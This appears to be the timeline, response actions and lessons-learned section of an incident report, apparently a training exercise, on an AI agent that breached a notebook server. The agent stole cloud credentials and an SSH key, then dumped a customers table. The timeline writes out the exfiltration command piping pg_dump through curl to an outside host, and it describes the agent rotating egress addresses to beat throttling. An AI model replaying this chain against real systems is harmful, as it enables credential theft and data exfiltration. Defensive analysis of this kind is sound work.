| 11:05:02 | Kernel session opens, uid=marimo; agent session `tg-4b81e0d7` begins | gf-tg-nb01 |
| 11:05:0x | `python3.12` PID 5211 spawned by `marimo edit --host 0.0.0.0 --no-token` | gf-tg-nb01 |
| 11:08:09 | Environment read — access key ID present, secret key absent | gf-tg-nb01 |
| 11:08:12 | Single connection to 169.254.169.254, attributed to PID 5211 | gf-tg-nb01 |
| 11:08:19 | Role credentials held for `svc-notebook` | — |
| 11:11:19 | Secrets Manager enumeration begins from 203.0.113.71 | — |
| 11:22:41 | `ListSecrets` throttled — `ThrottlingException` from 203.0.113.71 | — |
| 11:22:44 | Agent redistributes across Cloudflare Workers pool | — |
| 11:23:05–15 | Five further egress addresses enter service in 11 seconds | — |
| 11:31:16 | `GetSecretValue` — `prod/bastion/ssh-deploy-key`, `ReadOnly=false`, from 203.0.113.142 | — |
| 11:31:20 | Key written to `/tmp/.c/id_ed25519`, mode 600 | gf-tg-nb01 |
| 11:34:31 | SSH to bastion as `deploy` — ED25519 SHA256:mNq7xR2v… | gf-tg-bastion01 |
| 11:37:40 | `psql … '\dt+' \| sort -k7 -h \| tail -5` — tables enumerated by size | gf-tg-bastion01 |
| 11:37:42 | `customers` selected — 2,841,902 rows | gf-tg-pg01 |
| 11:40:49 | `pg_dump … \| gzip \| curl -T - https://203.0.113.41:8443/u` | gf-tg-bastion01 |
| 11:40:4x | Postgres logs `connection authorized … database=customers` | gf-tg-pg01 |
| 11:57:00 | Transfer complete — operation ends | — |

---

## 🛡️ Response Actions Taken
- Isolated all three hosts and preserved them for forensic imaging
- Patched marimo for CVE-2026-39987 and removed the notebook server from external exposure
- Restarted marimo without `--host 0.0.0.0` and with token authentication enabled — the exposed, unauthenticated launch flags were the root cause
- Rotated `prod/bastion/ssh-deploy-key` and revoked the key with fingerprint `ED25519 SHA256:mNq7xR2vTbY8kLpJ4wZaHc1oUeVgX5tDsFj0rWnAE` across the estate; the key material was unrecoverable from CloudTrail, so full compromise was assumed
- Disabled and reissued access key `AKIA4TIDEGLASS0EXAMPLE` and reviewed every action taken by `svc-notebook` in the window
- Blocked 198.51.100.23 and 203.0.113.41 at the perimeter; alerted on the full 203.0.113.0/24 Workers pool
- Enforced IMDSv2 on the notebook instance and restricted metadata access to the credential-helper process
- Scoped the breach at 2,841,902 customer records and initiated notification procedures on that figure
- Reviewed `deploy` account usage estate-wide and restricted the deploy key to non-interactive CI use
- Reviewed all other sessions in `LLMAgentLogs_CL` for further non-estate actors
- Shared IOCs and query logic with the Blue Team for detection rule creation

---

## 📘 Lessons Learned
- **Do not chain a pivot value across tables without confirming it.** Shell history showed `curl` fetching the metadata service, but the network log attributed that socket to the parent interpreter. Searching for the curl PID returns zero rows, and zero rows reads as *nothing happened* rather than *wrong value*. Confirm the pivot field exists in the destination table before treating an empty result as evidence.
- **The account beats the tool, every time.** `pg_dump` runs nightly by design. `publickey` is how all 318 legitimate admin logins authenticate. `python-httpx` is the estate's own client. In all three cases the tool was shared and the identity was the discriminator. A rule keyed on a binary name pages an analyst nightly and buries the real event in its own noise.
- **Process lineage outlives payloads.** 74 `python3.12` spawns, identical binary, same user, overlapping timing — and only one parented by a web server. Swap the interpreter and the parent stays marimo.
- **Rotating addresses does nothing if the credential is static.** Six egress addresses cycled in eleven seconds, all presenting `AKIA4TIDEGLASS0EXAMPLE`. Evasion worked at the network layer and failed completely at the identity layer.
- **Keep the address sets separate.** Three roles, three distinct sets: staging (198.51.100.23), the Workers pool (203.0.113.0/24), and the exfil drop (203.0.113.41). Conflating them produces a wrong incident narrative and wrong blocklists.
- **Naming a gap correctly is a finding.** CloudTrail records that a secret was read and returns a `VersionId` — never the value. That limit is by design, and stating it plainly is the right answer. It also drives the remediation: because we cannot know what was taken, we rotate as though all of it was.
- **When the attacker's host gives you nothing, ask the target.** The dump was piped through `gzip` into `curl` and never touched disk, so there was no file to find. PostgreSQL still logged `database=customers` against a host that otherwise only ever logs `greenfield_platform`. The server being read from always knows it was read.
- **Test an indicator against the baseline before calling it a tell.** `python-httpx/0.27.0` looked like clear automation evidence until all 22 `GetSecretValue` calls were pulled and the estate's own application turned out to use the same client. An indicator that is damning in isolation can be background once the baseline is actually queried.
- **An agent narrates what a human would never write down.** The CVE named before exploitation, the reasoning behind choosing `customers`, the decision to spread across an egress pool — all recorded by the attacker itself. Use it to build the hypothesis fast, then prove every step against the boring tables the attacker did not control.
- **Human-tasked is its own category.** One sentence of intent, then fifty-two unattended minutes across three hosts and a cloud account. The response question is not *who was at the keyboard* but *who wrote the instruction* — and the defensive question is how long an estate survives an adversary that never pauses, never fumbles, and adapts to a rate limit in under half a minute.

Report Completed By: Wilson Siano Status: ✅ All flags investigated and confirmed
